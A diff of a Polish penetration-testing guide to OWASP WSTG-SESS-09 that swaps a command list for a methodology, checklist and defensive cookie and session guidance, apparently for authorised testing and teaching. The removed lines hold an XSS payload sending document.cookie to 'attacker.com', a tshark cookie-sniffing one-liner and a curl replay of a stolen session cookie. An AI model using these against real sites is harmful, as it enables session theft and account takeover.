@@ -1,105 +1,41 @@
 # WSTG-SESS-09 — Testing for Session Hijacking
 
-## Cele
+## Cel
 
-- Identyfikacja podatnych cookies (brak flag bezpieczenstwa)
-- Przejecie sesji i ocena ryzyka
-- Sprawdzenie ochrony przed przejeciem sesji
+Audyt obrony przed session hijacking: TLS enforcement (sniffing), HttpOnly cookies (XSS), HSTS (downgrade), session ID nigdy w URL, token sidejacking prevention.
 
-## KOMENDY
-
-### Sprawdzenie czy cookie sesji jest przesylane bez flagi Secure (HTTP)
+## Automatyzacja Nuclei
 
 ```bash
-curl -v http://TARGET/ 2>&1 | grep -i "set-cookie"
-# Jezeli cookie jest ustawiane bez flagi Secure - mozliwy sniffing
+# Session in URL detection
+nuclei -l burp-export.xml -im burp -t templates/wstg-sess-09-session-hijacking.yaml
 
+# Cookie attributes
+nuclei -l burp-export.xml -im burp -t templates/wstg-sess-02-cookie-attributes.yaml
 ```
 
-### Sprawdzenie flagi HttpOnly (ochrona przed XSS -> session hijacking)
+## Standard pentesterski — jak to robi się wzorowo
 
-```bash
-curl -s -I TARGET | grep -i "set-cookie" | grep -iv "httponly"
-# Brak HttpOnly = cookie dostepne z JavaScript = mozliwe do kradziezy przez XSS
+### Metodologia (5 kroków)
 
-```
+1. **Cookie audit**: Secure + HttpOnly + SameSite (cross WSTG-SESS-02).
+2. **TLS enforcement**: HTTPS only + HSTS (cross WSTG-CONF-07, WSTG-CRYP-01).
+3. **URL session check**: czy session ID w URL params/path?
+4. **Token binding**: czy aplikacja binds session do user fingerprint (IP, UA, device)?
+5. **Concurrent session**: czy aplikacja allows multi-device login?
 
-### Symulacja kradziezy sesji przez XSS
+### Co MUSI być sprawdzone (10 punktów)
 
-```bash
-# Payload XSS do kradziezy cookie:
-# <script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>
-
-```
-
-### Test uzycia skradzionego cookie
-
-```bash
-curl -v -b "SESSIONID=STOLEN_SESSION_VALUE" TARGET/dashboard
-
-```
-
-### Wireshark - przechwycenie sesji w nieszyfrowanym ruchu
-
-```bash
-# tshark -i eth0 -f "tcp port 80" -Y "http.cookie" -T fields -e http.cookie
-# Przechwycone cookie mozna uzyc do hijackingu
-
-```
-
-### Sprawdzenie czy aplikacja wiaze sesje z IP/User-Agent
-
-```bash
-# Test 1: Zmiana User-Agent
-curl -v -b session_cookies.txt -H "User-Agent: DifferentBrowser/1.0" TARGET/dashboard
-# Test 2: Uzycie sesji z innego IP (przez proxy)
-curl -v -b session_cookies.txt --proxy socks5://PROXY_IP:PORT TARGET/dashboard
-
-```
-
-### Sprawdzenie ochrony session binding
-
-```bash
-curl -s -b session_cookies.txt -H "X-Forwarded-For: 1.2.3.4" TARGET/dashboard -o /dev/null -w "%{http_code}"
-
-```
-
-### Test Man-in-the-Middle (HSTS)
-
-```bash
-curl -s -I TARGET | grep -i "strict-transport-security"
-# Brak HSTS = mozliwy MITM i przechwycenie cookie
-
-```
-
-### Sprawdzenie czy sesja jest uniewazniana po wykryciu anomalii
-
-```bash
-# Zaloguj sie normalnie
-curl -s -c cookies.txt TARGET/login -d "user=test&pass=test"
-# Wyslij request z innym fingerprint
-curl -s -b cookies.txt -H "User-Agent: Suspicious" -H "Accept-Language: xx" TARGET/dashboard -o /dev/null -w "%{http_code}"
-
-```
-
-## KOMENDY Z WORDLISTAMI
-
-# Brak specyficznych wordlist dla tego testu.
-# Test opiera sie na analizie bezpieczenstwa transportu sesji i flag cookies.
-
-## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
-
-1. Sprawdz wszystkie flagi cookie w DevTools -> Application -> Cookies
-2. Sprawdz czy strona uzywa HTTPS na wszystkich endpointach
-3. Sprawdz naglowek HSTS (Strict-Transport-Security)
-4. Przetestuj czy cookie bez HttpOnly jest dostepne z konsoli JS (document.cookie)
-5. Skopiuj cookie sesji do innej przegladarki - czy sesja dziala?
-6. Sprawdz w Wireshark czy cookie jest przesylane w czystym tekscie
-7. Przetestuj czy zmiana IP/User-Agent powoduje uniewaznnienie sesji
-8. Sprawdz czy aplikacja implementuje re-autentykacje dla wrazliwych akcji
-
-
----
+- [ ] Session cookie: Secure + HttpOnly + SameSite
+- [ ] HTTPS only + HSTS
+- [ ] Session ID nigdy w URL
+- [ ] `__Host-` prefix dla session cookies
+- [ ] Session bound to fingerprint (IP/UA - debatable, can break legitimate scenarios)
+- [ ] Concurrent session limits
+- [ ] Active session view (user sees their sessions)
+- [ ] Session regenerated po login (cross WSTG-SESS-03)
+- [ ] CSP `frame-ancestors` (clickjacking session theft)
+- [ ] Browser storage NIE zawiera session token
 
 ## CHEATSHEET OWASP — Kluczowe wskazówki
 
@@ -107,66 +43,65 @@ curl -s -b cookies.txt -H "User-Agent: Suspicious" -H "Accept-Language: xx" TARG
 
 ### Wektory session hijacking
 
-- **Sniffing (siec)**: przechwycenie cookie w niezaszyfrowanym ruchu HTTP — obrona: TLS + Secure flag
+- **Sniffing (sieć)**: przechwycenie cookie w niezaszyfrowanym ruchu HTTP — obrona: TLS + Secure flag
 - **XSS**: JavaScript `document.cookie` wykrada cookie — obrona: HttpOnly flag
-- **Man-in-the-Middle**: atakujacy miedzy klientem a serwerem — obrona: HSTS + TLS
-- **Malware/browser extension**: odczyt cookies z przegladarki — obrona: krotki timeout + fingerprinting
-- **Physical access**: odczyt cookies z dysku/pamieci — obrona: session cookies (bez Expires)
+- **Man-in-the-Middle**: atakujący między klientem a serwerem — obrona: HSTS + TLS
+- **Malware/browser extension**: odczyt cookies z przeglądarki — obrona: krótki timeout + fingerprinting
+- **Physical access**: odczyt cookies z dysku/pamięci — obrona: session cookies (bez Expires)
 
 ### Obrona — atrybuty cookies
 
 - **Secure** — cookie TYLKO przez HTTPS — chroni przed sniffingiem
-- **HttpOnly** — cookie niedostepne dla JavaScript — chroni przed XSS
-- **SameSite=Strict/Lax** — ogranicza cross-site wysylanie — chroni przed CSRF
+- **HttpOnly** — cookie niedostępne dla JavaScript — chroni przed XSS
+- **SameSite=Strict/Lax** — ogranicza cross-site wysyłanie — chroni przed CSRF
 - **`__Host-` prefix** — wymusza Secure + Path=/ + brak Domain — najsilniejsza izolacja
 
 ### Token Sidejacking Prevention (technika z OWASP JWT Cheat Sheet)
 
-- Przy autentykacji wygeneruj **losowy fingerprint** (min 50 bajtow, CSPRNG)
-- Wyslij fingerprint w **hardened cookie**: `__Secure-Fgp=VALUE; SameSite=Strict; HttpOnly; Secure`
-- Przechowuj **SHA-256 hash** fingerprint w JWT/sesji (nie raw value — obrona przed XSS)
-- Przy walidacji tokenu: porownaj hash fingerprint z cookie z hashem w tokenie
-- Jesli cookie brakuje lub hash sie nie zgadza — odrzuc token (replay attack)
+- **User context fingerprint**: dodaj losowy string w hardened cookie (`__Secure-Fgp; Secure; HttpOnly; SameSite=Strict`)
+- Przechowuj **SHA-256 hash** fingerprint w JWT payload (nie raw value)
+- Sprawdzaj że request fingerprint = JWT fingerprint
+- Atakujący kradnący JWT bez cookie nie może go wykorzystać
 
-### Session binding (defence in depth)
+### Anomaly detection
 
-- Powiaz sesje z User-Agent jako dodatkowy sygnal (zmiana UA = podejrzane)
-- **NIE uzywaj IP** jako binding — moze sie zmieniac legitymicznie (mobilne sieci, VPN)
-- IP tracking moze tez naruszac GDPR w UE
-- Dodaj fingerprint przegladarki jako dodatkowa warstwe
+- Loguj IP, User-Agent, geolokalizację per session
+- Wykrywaj nagłe zmiany (różny continent, różny UA) → alert + force re-auth
 
-### Wykrywanie anomalii
+## Pentesterskie deep dive
 
-- Monitoruj jednoczesne sesje z roznych lokalizacji/urzadzen
-- Alertuj uzytkownika o nowym logowaniu z nieznanego urzadzenia
-- Wymagaj re-autentykacji przy wykryciu anomalii (zmiana IP, UA, lokalizacji)
-- Loguj wszystkie sesje i ich atrybuty (czas, IP, UA, geolokalizacja)
+### Mniej znane techniki
 
-### Minimalizacja okna ataku
+- **Session sidejacking via Wi-Fi**: open Wi-Fi + cookie bez Secure flag = trivial sniffing.
+- **Subdomain compromise → session theft**: XSS na subdomain z cookie domain wildcard.
+- **Browser extension theft**: malicious extension reads cookies bypass HttpOnly.
+- **Token sidejacking**: stolen JWT replayed from different IP - czy aplikacja wykrywa?
 
-- Krotki idle timeout (15-30 min) — mniej czasu na uzycie wykradzionego tokenu
-- Krotki absolute timeout (4-8h) — sesja wygasa niezaleznie od aktywnosci
-- Re-autentykacja dla operacji wrazliwych — nawet z aktywna sesja
+### Common pitfalls
 
-## ROZSZERZENIA BURP SUITE
+- **HttpOnly ignored "for legacy"**: jakaś legacy reason - klucz jest w localStorage gdzie XSS = pwn.
+- **Session bound to IP**: breaks mobile users na NAT/zmianach Wi-Fi → typowo nie aplikowane.
 
-Brak dedykowanych rozszerzen Burp dla tego testu.
+### Świeżynki z research
 
----
+- **OWASP JWT CS**: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
+- **HackTricks Session Hijacking**: https://book.hacktricks.xyz/pentesting-web
 
-## Wskazówki ASVS
+## Rozszerzenia Burp Suite
 
-Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.
+| Rozszerzenie | Opis |
+|---|---|
+| Cookie Editor | Cookie attributes audit |
 
-### L2 (Standardowy)
+## Źródła
 
-| ID | Sekcja | Wymaganie |
-|---|---|---|
-| V7.5.1 | Defenses Against Session Abuse | Verify that the application requires full re-authentication before allowing modifications to sensitive account attributes which may affect authentication such as email address, phone number, MFA configuration, or other information used in account recovery. |
-| V7.5.2 | Defenses Against Session Abuse | Verify that users are able to view and (having authenticated again with at least one factor) terminate any or all currently active sessions. |
+- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking
+- OWASP Session Management CS: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html
 
-### L3 (Zaawansowany)
+### Wskazówki ASVS
 
-| ID | Sekcja | Wymaganie |
-|---|---|---|
-| V7.5.3 | Defenses Against Session Abuse | Verify that the application requires further authentication with at least one factor or secondary verification before performing highly sensitive transactions or operations. |
+| ID | Wymaganie |
+|---|---|
+| V3.2.2 | Session ID never disclosed in URL/error/log. |
+| V3.4.1 | Cookie attributes Secure, HttpOnly, SameSite. |
+| V3.7.1 | Active session monitoring. |
